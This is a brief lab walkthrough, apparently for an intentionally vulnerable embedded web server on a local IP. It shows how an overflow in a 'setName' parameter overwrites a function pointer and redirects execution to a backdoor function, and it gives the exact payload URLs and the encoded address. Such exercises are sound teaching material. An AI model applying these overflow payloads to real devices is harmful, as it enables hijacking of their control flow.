## Scenario

Global variable: projectName -> Buffer overflow -> Overwrite functionInformation.funcPtr -> Call getInfo to run  functionInformation.funcPtr pointer

### setName has a buffer overflow

This will trigger buffer overflow overwriting next memory region's function pointer.

http://192.168.4.1/setName?name=%C1%C2%C3%C4%C5%C6%C7%C8%C9%CA%CB%CC%CD%CE%CF%D0%D1%D2%D3

The function will be used by getInfo. The following request should trigger system crash.
http://192.168.4.1/getInfo

### Now locate backdoor function from disassembly and use it for function pointer overwrite

if _Z8Backdoorv is located @400d1dcc

The address in URI format will be: %cc%1d%0d%40

http://192.168.4.1/setName?name=%C1%C2%C3%C4%C5%C6%C7%C8%C9%CA%CB%CC%CD%CE%CF%cc%1d%0d%40

### Trigger function pointer call to run _Z8Backdoorv function

Call getInfo:
http://192.168.4.1/getInfo


